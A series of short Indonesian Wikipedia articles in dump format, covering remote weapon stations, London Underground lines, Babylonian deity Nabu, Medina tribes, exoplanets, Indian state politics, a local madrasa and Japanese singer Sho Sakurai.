Typhoon adalah jenis stasiun senjata jarak jauh (remote weapon station) yang diproduksi oleh Rafael Advanced Defense Systems of Israel, dan prinsip-prinsip desain dan teknologi umum yang sama dengan Samson Remote Controlled Weapon Station (Samson RCWS), sistem darat yang diproduksi oleh pengembang yang sama. Seperti Samson RCWS, Typhoon juga multi konfigurasi.

Typhoon, dan varian ringannya, Mini Typhoon, yang digunakan oleh Angkatan Laut Israel, Angkatan Laut Australia, Angkatan Laut Royal Selandia Baru, Angkatan Laut Republik Singapura dan Polisi Coast Guard Singapura.




</doc>
<doc id="1757863" url="https://id.wikipedia.org/wiki?curid=1757863" title="M242 Bushmaster">
M242 Bushmaster

M242 Bushmaster adalah autocannon meriam otomatis 25 mm (25 × 137mm) sabuk rantai. Senjata ini digunakan secara luas oleh angkatan bersenjata Amerika Serikat, serta oleh NATO dan pasukan beberapa negara lain di kendaraan tempur darat dan perahu.

Awalnya, senjata dirancang dan diproduksi oleh McDonnell Douglas (kemudian diakuisisi oleh Boeing Corporation); namun sekarang diproduksi oleh Alliant Techsystems (ATK) dari Mesa, Arizona.



</doc>
<doc id="1757875" url="https://id.wikipedia.org/wiki?curid=1757875" title="CROWS">
CROWS

Common Remotely Operated Weapon Station (CROWS atau CROWS II) adalah stasiun senjata jarak jauh (remote weapon station) Amerika yang menyediakan operator dengan kemampuan untuk memperoleh dan terlibat target sementara di dalam kendaraan.

Senjata ini dirancang untuk dipasang pada berbagai platform kendaraan dan mendukung MK19 Grenade Machine Gun, .50 Caliber M2 Machine Gun, M240B Machine Gun, dan M249 Squad Automatic Weapon.



</doc>
<doc id="1757879" url="https://id.wikipedia.org/wiki?curid=1757879" title="Bumerang-BM">
Bumerang-BM

Bumerang-BM (Rusia: Бумеранг-БМ) atau Epoch adalah menara dikendalikan dari jarak jauh (remotely controlled turret) untuk T-15 Armata IFV berat, Kurganets-25 dan platform Bumerang.

Senjata ini pertama kali terlihat di depan umum pada tahun 2015 selama latihan untuk Victory Day Parade Moskow, dipasang pada tiga platform.



</doc>
<doc id="1757886" url="https://id.wikipedia.org/wiki?curid=1757886" title="Jalur Bakerloo">
Jalur Bakerloo

Jalur Bakerloo adalah salah satu jalur London Underground, dengan warna coklat di peta. Relnya berada sebagian di atas tanah dan sebagian berada di bawah tanah, mulai dari London Tengah sampai Harrow & Wealdstone di pinggiran barat laut kota. Jalur ini memiliki 25 stasiun. Dinamai demikian karena jalur ini melayani Baker Street dan Waterloo. Di utara Queen's Park (jalur yang melayang), jalur ini menggunakan rel yang sama dengan Jalur Watford DC London Overground.



</doc>
<doc id="1757902" url="https://id.wikipedia.org/wiki?curid=1757902" title="Nabu">
Nabu

Nabu (atau Nebo dalam Kitab Suci Ibrani נבו "nebo") adalah dewa kebijaksanaan dan penulisan Asyur dan Babilonia, yang disembah oleh bangsa Babilonia sebagai putra Marduk dan permaisurinya, Sarpanitum, dan sebagai cucu dari Ea. Permaisuri Nabu adalah Tashmetum.

Awalnya, Nabu adalah sebuah deitas Semitik Barat yang diperkenalkan oleh bangsa Amorit di Mesopotamia, kemungkinan pada masa yang sama dengan Marduk tak lama setelah 2000 SM. Ketika Marduk menjadi deitas utama Babilonia, Nabu tinggal di dekat Borsippa di kuilnya E-zida. Ia pertama kali disebut "scribe dan menteri dari Marduk", kemudian diasimilasikan sebagai putra kesayangan Marduk dari Sarpanitum. Pada Perayaan Tahun Baru Babilonia, patung kultus Nabu dibawa dari Borsippa ke Babilonia dalam rangka untuk komune dengan ayahnya Marduk.

Nabu kemudian menjadi salah satu dewa penting di Asiria. Pada astrologi Babilonia akhir, Nabu dihubung-hubungkan dengan planet Merkurius.

Nabu disebutkan dalam Nevi'im dari Tanakh dengan nama Nebo dalam .

Sebuah patung Nabu dari kota Kalah, didirikan pada masa pemerintahan raja Asiria, Tiglath-Pileser III yang sekarang disimpan di British Museum.




</doc>
<doc id="1757904" url="https://id.wikipedia.org/wiki?curid=1757904" title="The Best of Me (novel)">
The Best of Me (novel)

The Best of Me (terjemahan bahasa Indonesia: Yang Terbaik Dariku) adalah sebuah novel terjemahan dari novel asli Amerika Serikat karya Nicholas Sparks. Novel ini merupakan novel romantis yang dirilis pada bulan Oktober 2011 oleh penerbit Grand Central Publishing di Amerika Serikat dan Gramedia Pustaka Utama di Indonesia. Novel ini berlatar tempat di Oriental, Carolina Utara.

Pada musim semi tahun 1984, siswa SMA Amanda Collier dan Dawson Cole jatuh cinta. Meskipun mereka berasal dari sisi yang berlawanan , cinta mereka menentang realitas kehidupan di kota kecil Oriental, Carolina Utara. Tetapi pada musim panas menjelang kelulusan mereka, kejadian tak terduga akan memisahkan pasangan muda tersebut, membuat mereka berjalan ke jalur yang berbeda. Dua puluh lima tahun kemudian, Amanda dan Dawson dipanggil kembali ke Oriental untuk pemakaman Tuck Hostetler, mentor yang pernah memberikan perlindungan bagi asmara mereka saat muda. Menjalani kehidupan mereka masing-masing, dan tidak bisa melupakan gairah cinta pertama yang selamanya mengubah hidup mereka. Karena Amanda dan Dawson melaksanakan instruksi Tuck yang ditinggalkan untuk mereka, mereka menyadari segala sesuatu yang mereka telah pahami - tentang Tuck, diri mereka, dan mimpi mereka - tidak seperti yang terlihat. Dipaksa untuk menghadapi kenangan menyakitkan, kedua mantan pasangan ini akan menemukan kebenaran tak terbantahkan tentang pilihan yang telah mereka buat. Dan dalam kehidupan, akhir pekan, mereka bertanya tentang kehidupan dan kematian: Bisakah cinta dapat membuat kembali masa lalu?


Film adaptasi dari novel "The Best of Me" dirilis pada tanggal 17 Oktober 2014 di Amerika Serikat. Film ini disutradarai oleh Michael Hoffman dan diproduseri oleh Justin Burns, Denise Di Novi, Alison Greenspan, Ryan Kavanaugh, dan Nicholas Sparks. Naskah dari film ini ditulis oleh Will Fetters dan J. Mills Goodloe. Film ini dibintangi oleh James Marsden sebagai Dawson Cole dewasa, Michelle Monaghan sebagai Amanda Collier dewasa, Luke Bracey sebagai Dawson Cole muda, Liana Liberato sebagai Amanda Collier muda, dan Gerald McRaney sebagai Tuck Hostetler (ayah angkat dan teman Dawson).



</doc>
<doc id="1757906" url="https://id.wikipedia.org/wiki?curid=1757906" title="Homalophis">
Homalophis

Homalophis adalah genus ular lumpur dari suku Homalopsidae. Genus ini merupakan genus separasi karena sebelumnya, semua spesies dalam genus ini termasuk ke dalam genus "Enhydris". Namun studi DNA membuktikan bahwa spesies dalam genus ini lebih dekat dengan genus "Homalopsis". Genus ini meliputi 2 spesies dan seluruhnya terdapat di Kalimantan.


Jenis lain dari genus ini adalah Ular-lumpur sumatera ("Sumatrananguis albomaculata") yang terdapat di Sumatra dan sekitarnya.



</doc>
<doc id="1757909" url="https://id.wikipedia.org/wiki?curid=1757909" title="Sekretariat Kementerian Perencanaan Pembangunan Nasional Republik Indonesia">
Sekretariat Kementerian Perencanaan Pembangunan Nasional Republik Indonesia

Sekretariat Kementerian Perencanaan Pembangunan Nasional Republik Indonesia/Sekretariat Utama Badan Perencanaan Pembangunan Nasional merupakan unsur pembantu Menteri Negara Perencanaan Pembangunan Nasional/Kepala Badan Perencanaan Pembangunan Nasional dalam penyelenggaraan dan pembinaan administrasi Kementerian Negara Perencanaan Pembangunan Nasional/Badan Perencanaan Pembangunan Nasional.

Sekretariat Kementerian Negara/Sekretariat Utama mempunyai tugas melaksanakan koordinasi perencanaan, pembinaan, dan pengendalian terhadap program, kegiatan, administrasi, dan sumber daya di lingkungan Kementerian Negara Perencanaan Pembangunan Nasional/Badan Perencanaan Pembangunan Nasional

Dalam melaksanakan tugas, Sekretariat Kementerian Negara Perencanaan Pembangunan Nasional/Sekretariat Utama Badan Perencanaan Pembangunan Nasional menyelenggarakan fungsi:




</doc>
<doc id="1757912" url="https://id.wikipedia.org/wiki?curid=1757912" title="Brachyorrhos">
Brachyorrhos

Brachyorrhos adalah genus ular air dari suku Homalopsidae yang endemik di Indonesia Timur. Terdapat 4 spesies.




</doc>
<doc id="1757913" url="https://id.wikipedia.org/wiki?curid=1757913" title="Alan Stern">
Alan Stern

S. Alan Stern (kelahiran 22 November 1957, di New Orleans, Louisiana) adalah seorang ilmuwan planetarium Amerika. Ia adalah investigator prinsipal misi New Horizons ke Pluto dan Ketua Ilmuwan di Moon Express.

Stern telah terlibat dalam 24 misi ruang angkasa suborbital, orbital, dan planetarium, termasuk delapan diantaranya di mana ia menjadi investigator prinsipal pada misi tersebut. Salah satu proyeknya adalah Southwest Ultraviolet Imaging System, sebuah instrumen yang menerbangkan dua misi pesawat ruang angkasa, STS-85 pada 1997 dan STS-93 pada 1999.

Stern juga telah mengembangkan delapan instrumen saintifik untuk planetarium dan misi penelitian dekat ruang angkasa dan juga menjadi observer tamu pada sejumlah observatorium satelit NASA, yakni International Ultraviolet Explorer, Hubble Space Telescope, the International Infrared Observer dan Extreme Ultraviolet Observer. Stern adalah Direktur Eksekutif Divisi Teknik dan Ilmu Pengetahuan Ruang Angkasa Southwest Research Institute sampai menjadi Administrator Asosiasi Direktorat Misi Ilmu Pengetahuan NASA pada 2007. Ia mengundurkan diri dari jabatan tersebut setelah sekitar setahun.

Stern lulus dari St. Mark's School of Texas pada 1975. Ia kemudian masuk ke Universitas Texas, Austin, di mana ia meraih gelr sarjananya dalam bidang fisika & astronomi dan gelar masternya dalam bidang teknik aerospace dan atmosfer planetarium. Ia meraih gelar dokterandesnya dalam bidang astrofisika dan ilmu pengetahuan planetarium dari Universitas Colorado, Boulder.

Pada 2007, Stern dimasukkan pada 100 Tokoh Paling Berpengaruh di Dunia menurut Majalah Time.



</doc>
<doc id="1757914" url="https://id.wikipedia.org/wiki?curid=1757914" title="Calamophis">
Calamophis

Calamophis adalah genus ular air dari suku Homalopsidae yang endemik di wilayah Irian Jaya, Papua Nugini, dan sekitarnya. Terdapat 5 spesies.




</doc>
<doc id="1757918" url="https://id.wikipedia.org/wiki?curid=1757918" title="Oph 162225-240515">
Oph 162225-240515

Oph 162225-240515, yang sering disingkat Oph1622, adalah sepasang planet katai coklat yang dikabarkan mengorbit satu sama lain. Badannya terletak di konstelasi Ophiuchus dan jauhnya sekitar 400 tahun cahaya.

Penemuan pasangan planet katai tersebut diumumkan dalam sebuah artikel Ilmu Pengetahuan 2006 oleh Ray Jayawardhana dan Valentin D. Ivanov
. Objek-objek tersebut ditemukan menggunakan Teleskop Teknologi Baru di Observatorium Eropa Selatan di La Silla, Chili.



</doc>
<doc id="1757919" url="https://id.wikipedia.org/wiki?curid=1757919" title="SMKN 4 Banjarbaru">
SMKN 4 Banjarbaru

SMK Negeri 4 Banjarbaru terletak di Jalan Kong. Ex, Kelurahan Landasan Ulin Selatan, Kecamatan Liang Anggang, Kota Banjarbaru, Kalimantan Selatan.

SMKN 4 Banjarbaru dibangun di tanah milik Pemko Banjarbaru dengan luas lahan 3 hektar. Peletakan batu pertama dilakukan oleh Wali kota Banjarbaru, Drs. H.M. Ruzaidin Noor, M.AP pada 29 Agustus 2013. Pelaksana pembangunan dipimpin oleh Drs. Parjiono, M.Pd, yang juga merupakan Kepala SMKN 2 Banjarbaru.
Namun operasional SMKN 4 Banjarbaru telah dimulai sejak Juli 2013 yaitu awal Tahun Pelajaran 2013/2014. Sedangkan izin operasional diterbitkankan pada 27 Januari 2014 dengan Surat Keputusan Wali kota Banjarbaru No. 015 Tahun 2014. Tanggal 27 Januari dijadikan sebagai hari berdirinya SMKN 4 Banjarbaru.
Pada awal Tahun Pelajaran 2013/2014, SMKN 4 Banjarbaru membuka dua kompetensi keahlian, yaitu Multimedia dan Pemasaran. Namun karena sosialisasi yang kurang, siswa yang masuk hanya 17 orang pada kompetensi keahlian Multimedia, sedang pada Pemasaran tidak ada yang mendaftar.
Pada Tahun Pelajaran 2015/2016 dibuka kompetensi keahlian Teknik Sepeda Motor, selanjutnya pada Tahun Pelajaran 2018/2019 dibuka kompetensi keahlian Rekayasa Perangkat Lunak. Sehingga sekarang SMKN 4 Banjarbaru melayani 4 kompetensi keahlian, yaitu Teknik dan Bisnis Sepeda Motor, Rekayasa Perangkat Lunak, Multimedia, serta Bisnis Daring dan Pemasaran.

SMK negeri 4 Banjarbaru membuka 4 kompetensi keahlian, yaitu:
SMKN 4 Banjarbaru memiliki sarana prasarana:

SMKN 4 Banjarbaru telah menjalin kerjasama dengan dunia usaha/dunia industri, terutama di bidang Praktik Kerja Industri dan penyiapan lulusan siap kerja.

!width=25|No.
!width=200|Kegiatan
!width=200|Tahun
!width=100|Tingkat
!width=100|Predikat


</doc>
<doc id="1757923" url="https://id.wikipedia.org/wiki?curid=1757923" title="Jalur Lingkar (London Underground)">
Jalur Lingkar (London Underground)

Jalur Lingkar adalah salah satu jalur London Underground, memiliki rute dari Hammersmith ke Edgware Road dan kemudian mengelilingi sekitar London tengah dan kembali ke Jalan Edgware. Dengan warna kuning di peta, jalur ini memiliki panjang rute 27 km dengan 36 stasiun. Banyak rutenya digunakan bersama dengan Jalur Distrik, Hammersmith & City dan Jalur Metropolitan.



</doc>
<doc id="1757927" url="https://id.wikipedia.org/wiki?curid=1757927" title="Pythagoreanisme">
Pythagoreanisme

Pythagoreanisme adalah sistem esoterik dan kepercayaan metafisika yang dipegang oleh Pythagoras dan para pengikutnya, Pythagorean, yang dianggap dipengaruhi oleh matematika, musik dan astronomi. Pythagoreanisme bermula pada abad ke-5 SM dan sekarang dipengaruhi platonisme. Kemudian, kebangkitan doktrin-doktrin Pythagorean membawa pada apa yang sekarang disebut Neopythagoreanisme.




</doc>
<doc id="1757934" url="https://id.wikipedia.org/wiki?curid=1757934" title="Bani Khazraj">
Bani Khazraj

Bani Khazraj () adalah salah satu kabilah Arab yang tinggal di Madinah pada masa awal penyebaran agama Islam. Nenek moyang Bani Khazraj berasal dari daerah Yaman, yang hijrah ke Yathrib (nama lama Madinah) setelah terjadi bencana pecahnya bendungan Ma'rib.

Nama kabilah ini berasal dari nama Al-Khazraj bin Haritsah bin Tsa'labah bin Amr Muzaiqiya, yang mana Amr Muzaiqiya adalah salah seorang pemimpin Bani Azad yang memimpin kaumnya berhijrah dari Yaman. Bani Khazraj dan kerabatnya Bani Aus adalah keturunan dari ibu yang sama, yaitu Qailah binti Kahil istri Haritsah bin Tsa'labah, dan dengan demikian secara bersama-sama juga mendapat julukan "Bani Qailah". Bani Khazraj terbagi menjadi banyak puak keluarga, di antaranya terutama adalah Bani Auf, Bani Al-Harits, Bani Sa'idah, Bani Jusyam, dan Bani an-Najjar. Sesembahan utama Bani Khazraj pada masa pra-Islam adalah Manat, sebuah berhala yang letaknya di Qadid pada lintas jalur perdagangan antara Mekkah dan Madinah.

Pada musim haji tahun ke-11 dakwah Muhammad, enam orang kabilah Bani Khazraj, yaitu As'ad bin Zurarah dan Auf bin Harits dari Bani an-Najjar, Rafi bin Malik dari Bani Zuraiq, Quthbah bin Amir dari Bani Salamah, Uqbah bin Amir dari Bani Hiram, dan Jabir bin Abdiwah dari Bani Ubaid, melakukan baiat masuk Islam di Aqabah, Mina. Merekalah orang-orang Yatsrib terawal yang menjadi Muslim, dan mereka lalu menyebarkan ajaran tersebut kepada para penduduk lainnya. Pada musim haji tahun berikutnya, mereka datang untuk kembali berbaiat disertai lima orang baru dari Bani Khazraj dan dua orang dari Bani Aus yang mana peristiwa itu disebut sebagai Baiat Aqabah I. Pesatnya perkembangan Islam di Yathrib menyebabkan pada musim haji tahun ke-13, 62 laki-laki dan 2 perempuan dari Bani Khazraj dan 11 laki-laki dari Bani Aus kembali berbaiat pada peristiwa Baiat Aqabah II.

Sebelum dipersatukan melalui Piagam Madinah, Banu Khazraj bersekutu dengan suku Yahudi Bani Qaynuqa untuk menghadapi Bani Aus dan sekutunya. Setelah masuk Islam, Bani Khazraj dan Bani Aus disebut secara bersama-sama sebagai kaum Anshar. Kaum Anshar dan kaum Muhajirin selanjutnya bersatu dalam mendukung kepemimpinan Muhammad dan para khalifah penerusnya dalam menegakkan pemerintahan serta menyebarkan agama Islam, terutama di Madinah serta Jazirah Arabia pada umumnya.




</doc>
<doc id="1757935" url="https://id.wikipedia.org/wiki?curid=1757935" title="Bani Aus">
Bani Aus

Bani Aus () adalah salah satu kabilah Arab yang tinggal di Madinah pada masa awal penyebaran agama Islam. Nenek moyang Bani Aus berasal dari daerah Yaman, yang hijrah ke Yathrib (nama lama Madinah) setelah terjadi bencana pecahnya bendungan Ma'rib.

Nama kabilah ini berasal dari nama Al-Aus bin Haritsah bin Tsa'labah bin Amr Muzaiqiya, yang mana Amr Muzaiqiya adalah salah seorang pemimpin Bani Azad yang memimpin kaumnya berhijrah dari Yaman. Bani Aus dan kerabatnya Bani Khazraj adalah keturunan dari ibu yang sama, yaitu Qailah binti Kahil istri Haritsah bin Tsa'labah, dan dengan demikian secara bersama-sama juga mendapat julukan "Bani Qailah". Bani Aus terbagi menjadi banyak puak keluarga, di antaranya terutama adalah Bani Amru bin Auf dan Bani An-Nabit. Sesembahan utama Bani Aus pada masa pra-Islam adalah Manat, sebuah berhala yang letaknya di Qadid pada lintas jalur perdagangan antara Mekkah dan Madinah.

Pada musim haji tahun ke-12 dakwah Muhammad, dua orang dari Bani Aus yaitu Abdul Haitam bin at-Taiham dan Uwaim bin Saidah, serta sepuluh orang Bani Khazraj berbaiat terhadap agama Islam dalam peristiwa Baiat Aqabah I. Mereka menyebarkan ajaran tersebut pada para penduduk Yathrib lainnya, dan pesatnya perkembangan yang terjadi menyebabkan pada musim haji tahun ke-13, 11 orang dari Bani Aus dan 64 orang dari Bani Khazraj kembali berbaiat pada peristiwa Baiat Aqabah II.

Sebelum dipersatukan melalui Piagam Madinah, Banu Aus bersekutu dengan suku-suku Yahudi Bani Qurayzhah dan Bani Nadhir untuk menghadapi Bani Khazraj dan sekutunya. Setelah masuk Islam, Bani Aus dan Bani Khazraj disebut secara bersama-sama sebagai kaum Anshar. Kaum Anshar dan kaum Muhajirin selanjutnya bersatu dalam mendukung kepemimpinan Muhammad dan para khalifah penerusnya dalam menegakkan pemerintahan serta menyebarkan agama Islam, terutama di Madinah serta Jazirah Arabia pada umumnya.




</doc>
<doc id="1757936" url="https://id.wikipedia.org/wiki?curid=1757936" title="Radar lock-on">
Radar lock-on

Lock-on adalah fitur dari banyak sistem radar yang memungkinkan untuk secara otomatis mengikuti target yang dipilih. Lock-on pertama kali dirancang untuk radar AI Mk. IX di Inggris, tetapi pertama kali digunakan secara luas oleh radar berbasis darat US SCR-584. SCR-584 menunjukkan kemampuan untuk dengan mudah melacak hampir setiap sasaran udara, dari pesawat ke artileri.



</doc>
<doc id="1757937" url="https://id.wikipedia.org/wiki?curid=1757937" title="Kepler-20">
Kepler-20

Kepler-20 adalah sebuah bintang yang berjarak 950 tahun cahaya dari Bumi dalam konstelasi Lyra dengan sistem lima planet yang diketahui. Pancaran magnitude dari bintang ini adalah 12.51, sehingga bintang tersebut tidak dapat dilihat dengan mata telanjang.

Pada 20 Desember 2011, tim Teleskop Ruang Angkasa Kepler melaporkan penemuan sistem lima planet yang berisi tiga raksasa gas kecil dan dua planet luar surya seukuran Bumi pertama, Kepler-20e (planet luar surya yang pertama kali diketahui lebih kecil ketimbang Bumi yang mengorbit sebuah bintang) dan Kepler-20f, mengorbit sebuah bintang mirip matahari. Meskipun planet-planet tersebut adalah seukuran Bumi, planet-planet tersebut tidaklah mirip Bumi dalam hal bahwa planet-planet tersebut lebih dekat dengan bintangnya ketimbang Bumi, dan bukanlah zona yang layak ditinggali, dengan masing-masing temperatur permukaan dan . Tiga planet lainnya seukuran Neptunus di sistem tersebut, Kepler-20b, Kepler-20c, dan Kepler-20d, semua sama-sama mengorbit berdekatan dengan bintangnya.




</doc>
<doc id="1757941" url="https://id.wikipedia.org/wiki?curid=1757941" title="Komunisme dan homoseksualitas">
Komunisme dan homoseksualitas

Pandangan terhadap hak asasi LGBT dan homoseksualitas dalam sejarah komunisme beragam. Meskipun homoseksualitas dianggap oleh beberapa orang komunis sebagai "salah satu efek sosialitas kapitalis" dan produk borjuis, beberapa orang komunis yang paling terkini berpendapat bahwa kebebasan gay dan kesetaraan LGBT adalah sebuah masalah penting.

Karl Marx sendiri sangat jarang mendiskusikan seksualitas. Pada 1917 di Republik Sosialis Federatif Soviet Rusia, Vladimir Lenin mendekriminalisasikan homoseksualitas, dan membolehkan orang homoseksual untuk menjabat dalam pemerintahan. Joseph Stalin mengkriminalisasikan kembali homoseksualitas pada 1933.

Homoseksualitas didekriminalisasikan di Tiongkok pada 1997 dan dihapuskan sebagai penyakit mental pada 2002. Masyarakat Tionghoa sendiri menjadi lebih toleran terhadap homoseksualitas, dan Li Yinhe, seorang anggota Konferensi Konsultatif Politik Rakyat Tiongkok, adalah seorang aktivis hak asasi LGBT.

Sebelum Revolusi Kuba, Kuba memiliki hukum yang mengkriminalisasikan dan menargetkan laki-laki gay, yang disebut "maricón", (sebuah istilah yang sama dengan "maho" dalam bahasa Indonesia). Homoseksualitas laki-laki adalah bagian utama dari industri prostitusi di Kuba untuk pengunjung dan pelayan Amerika dan dikaitkan dengan aktivitas judi dan kejahatan.

Tak lama setelah Revolusi Kuba, pandangan para pemimpin Kuba terhadap masalah homoseksualitas menjadi berbalik, dan toleransi terhadap orang-orang LGBT dilakukan di Kuba.

Sejak Pathet Lao yang terjadi pada 1975, pemerintah Laos sangat mendiamkan hak asasi LGBT dan homoseksualitas itu sendiri. Homoseksualitas tidak dianggap sebagai kejahatan di Laos, namun homoseksualitas perempuan dipandang sebaliknya meskipun homoseksualitas laki-laki lebih dihargai. Pertumbuhan jumlah homoseksualitas di Laos berlanjut.

Media yang dijalankan negara di Vietnam pada 2002 menyebut homoseksualitas sebagai "kejahatan sosial"; membandingkannya dengan prostitusi dan judi, dan mendukung hukum-hukum yang menentangnya. , hukum seperti itu tidak diperkenalkan. Di lain pihak, Surat Kabar Pemuda Komunis menampilkan sebuah kisah yang menyatakan bahwa "beberapa orang terlahir gay, seperti halnya beberapa orang yang terlahir kidal". Menurut sebuah studi yang diambil di Ho Chi Minh City , hanya 20% murid sekolah tinggi di Vietnam yang percaya bahwa gay adalah "hal buruk", dan bahwa 25% anak sekolahan Vietnam percaya bahwa 10% dari teman-teman sekelasnya mungkin gay.

Pada 5 Agustus 2012, Vietnam mentuanrumahi pawai gay pertamanya.



</doc>
<doc id="1757945" url="https://id.wikipedia.org/wiki?curid=1757945" title="Daftar Ketua Menteri Bengal Barat">
Daftar Ketua Menteri Bengal Barat

Ketua Menteri Bengal Barat adalah ketua eksekutif negara bagian India timur Bengal Barat. Sesuai dengan Konstitusi India, gubernur adalah seorang kepala "de jure" negara bagian, namun otoritas eksekutif "de facto" dipegang ketua menteri. Setelah pemilihan-pemilihan dari Majelis Legislatif Bengal Barat, gubernur negara bagian tersebut biasanya mengundang partai (atau koalisi) dengan mayoritas kursi dari bentuk pemerintahan tersebut. Gubernur yang melantik ketua menteri, di mana dewan menteri menjadi penanggung jawab kolektif dari majelis tersebut. Memberikannya kepercayaan dari majelis tersebut, masa jabatan ketua menteri biasanya paling lama lima tahun; tidak ada batas-batas untuk jumlah masa jabatan yang ia dapat jabati.

Bengal Barat dibentuk pada Agustus 1947, setelah pemisahan dari provinsi India Britania Bengal. Sejak itu, negara bagian tersebut memiliki delapan ketua menteri, dimulai dengan Prafulla Chandra Ghosh dari Kongres Nasional India. Masa jabatannya selama lima bulan sebagai Perdana Menteri Bengal Barat—jabatan yang dipegang sampai Januari 1950—diteruskan oleh masa jabatan selama 14 tahun dari rekan anggota Kongres-nya Bidhan Chandra Roy, yang meninggal pada 1962 dan membuat Prafulla Chandra Sen menjalani sisa masa jabatannya. Periode ketidakstabilan politik menyusul—Bengal Barat mengalami tiga pemilu, empat pemerintahan koalisi dan tiga masa pemerintahan Presiden antara 1967 dan 1972—sebelum Siddhartha Shankar Ray dari partai Kongres memegang masa jabatan lima tahun.

Kemanangan longsor dari Front Kiri pimpinan Partai Komunis India (Marxis) dalam pemilu 1977 memulai masa pemerintahan 23 tahun dari Jyoti Basu pada jabatan ketua menteri, sebuah rekor India sampai 2018. Penerusnya Buddhadeb Bhattacharya melanjutkan pemerintahan Komunis di Bengal Barat untuk dekade lainnya, saat Front Kiri dikalahkan dalam pemilu 2011 oleh Aliansi Progresif Bersatu (United Progressive Alliance, UPA) pimpinan Kongres Trinamool. Dilantik pada 20 Mei 2011, pemimpin Trinamool Mamata Banerjee menjadi ketua menteri petahana Bengal Barat, wanita pertama yang memegang jabatan tersebut. Pada September 2012, partainya keluar dari UPA, dan maju sendiri ke pemilu 2016, kembali ke kekuasaan dengan peningkatan mandat.




</doc>
<doc id="1757947" url="https://id.wikipedia.org/wiki?curid=1757947" title="Madarasah Diniyah Al Anwar Tlapak">
Madarasah Diniyah Al Anwar Tlapak

pada tahun 2002 (kurang lebih). Semula aktivitas Madarasah diniyah ini adalah dirumah Ustadz Khoirul Anwar dengan jumlah Santri 8 Orang saja, sehingga seiring bertambahnya waktu menjadi 25 santri yang mengaji di Madarasah ini.

Karena ramai yang mengaji ilmu agama dari Ustadz Khoirul Anwar dan rumah Beliau sudah tidak muat menampung santri lagi, para warga sekitar memberikan sumbangan berupa material, fikiran, dan tenaga untuk mendirikan sebuah Mushola di samping rumah Beliau dengan ukuran 5x6 meter. Semula di Madarasah diniyah ini hanya menerima santri laki-laki saja, tetapi ketika ada 4 orang santriwati yaitu Af'idah, Ulfa, Riya, dan Zaitun yang ingin menimba ilmu kepada Ustadz Khoirul Anwar, Dia tidak bisa menolaknya. Dan akhirnya mulai berduyun-duyun pemuda dan pemudi dari dukuh Telapak ingin menimba ilmu agama dari Ustadz Khoirul Anwar, dan Mushola pun tak mampu untuk menampung para santri itu.

Dua tahun setelah didirikanya Madarasah diniyah Al Anwar Tlapak kurang lebih tahun 2004, kepala dusun (kasun) Tlapak Bapak KH M. Ridwan haris (yang menjabat kasun saat itu) berinisiatif meresmikan tempat pengajian ini sebagai Madarasah diniyah dengan mendaftarkan di Kecamatan Sukosewu.
Hingga sampai saat ini, madarasah ini telah mendidik lebih dari 400 orang santriwan dan santriwati, yang rata-rata berasal dari Desa sitiaji, Balongrejo (kecamatan sugihwaras), Genjor (kecamatan sugihwaras), dan sekitarnya.
Kondisi Mushola Al-anwar yang sekarang berukuran 5x12 Meter memaksa Ustadz Khoirul Anwar mengajar Santriwan dan Santriwati secara bergiliran, di Mushola, teras Mushola, dan Rumah Beliau sendiri. Jika artikel ini dibaca oleh Bapak Bupati Kabupaten Bojonegoro Mohon kesediaanya untuk meninjau lokasi Madarasah diniyah Al Anwar Tlapak.

Sumber:
1. https://www.facebook.com/al.anwar.tlapak


</doc>
<doc id="1757952" url="https://id.wikipedia.org/wiki?curid=1757952" title="Jalur Piccadilly">
Jalur Piccadilly

Jalur Piccadilly adalah salah satu jalur London Underground, berwarna biru tua di peta. Jalur ini merupakan jalur tersibuk keempat di jaringan Underground, dengan jumlah penumpang tahunan mencapai 210.000.000. Dari 53 stasiun yang ada, 25 diantaranya berada di bawah tanah. Beberapa stasiunnya juga digunakan oleh jalur Distrik dan jalur Metropolitan. Jalur ini banyak melewati tempat-tempat menarik bagi wisatawan, diantaranya Harrods, Hyde Park, Buckingham Palace, Piccadilly Circus, Leicester Square dan Covent Garden, juga London Heathrow Airport, bandara tersibuk di Eropa.



</doc>
<doc id="1757955" url="https://id.wikipedia.org/wiki?curid=1757955" title="Jalur Hammersmith &amp; City">
Jalur Hammersmith &amp; City

Jalur Hammersmith & City London Underground memiliki rute antara Hammersmith dan Barking. Berwarna pink di peta Underground, jalur ini memiliki 29 stasiun dengan panjang rute . Banyak jalur dan stasiunnya berbagi dengan Jalur Distrik, Lingkar atau Jalur Metropolitan. Bersama dengan Jalur Lingkar, jalur ini digunakan lebih dari 114 juta perjalanan per tahunnya.



</doc>
<doc id="1757967" url="https://id.wikipedia.org/wiki?curid=1757967" title="Sho Sakurai">
Sho Sakurai

Sho memulai kariernya di dunia entertainment ketika ia bergabung dengan sebuah agensi ternama Jepang Johnny & Associates pada tahun 1995 di umurnya yang ke-13 tahun. Kemudian, pada tahun 1999 ia debut bersama Satoshi Ohno, Kazunari Ninomiya, Jun Matsumoto, dan Masaki Aiba sebagai boyband Arashi. Sekitar 7 tahun setelah ia debut sebagai Arashi, tepatnya pada tahun 2006 Sho mulai memulai kariernya sebagai seorang Presenter dalam sebuah program bernama "News Zero" yang tayang setiap Senin. Pada tahun 2008, Sho ditunjuk untuk menjadi penyiar berita di Olympic Games di Beijing yang ditayangkan di NTV. Untuk pekerjaannya sebagai Aktor, Penyanyi, dan Presenter, Sho menjadi salah satu penenerima penghargaan "Japan's Men of The Year" pada tahun 2009.

Sho lahir di Minato, Tokyo sebagai anak tertua di keluarganya. Ia memiliki 2 orang adik; seorang adik perempuan yang 5 tahun lebih muda darinya bernama Mai Sakurai dan seorang adik laki-laki yang 13 tahun lebih muda darinya bernama Shu Sakurai.

Ayahnya, Shun Sakurai, adalah mantan wakil Menteri Urusan Internal dan Komunikasi Jepang. Namun ia menggundurkan diri dari jabatannya tersebut pada tahun 2016. Setelah mengundurkan diri, pada tahun yang sama, Partai Demokrasi Liberal memintanya untuk mengikuti pemilihan gubernur Tokyo, bahkan perdana menteri Jepang, Abe Shinzo juga memintanya secara pribadi, namun ditolak olehnya dengan alasan tidak ingin menganggu karier anaknya. Pada akhir tahun 2016, Shun Sakurai ditunjuk menjadi konsultan Bank Sumitomo, perusahaan tepercaya terbesar di Jepang yang berada di bawah "Sumitomo Mitsui Trust Group". Sementara itu, ibu Sho yang bernama Yoko Sakurai adalah seorang dosen bahasa Inggris di Universitas Komazawa sekaligus ahli waris dari sebuah perusahaan di Gunma.

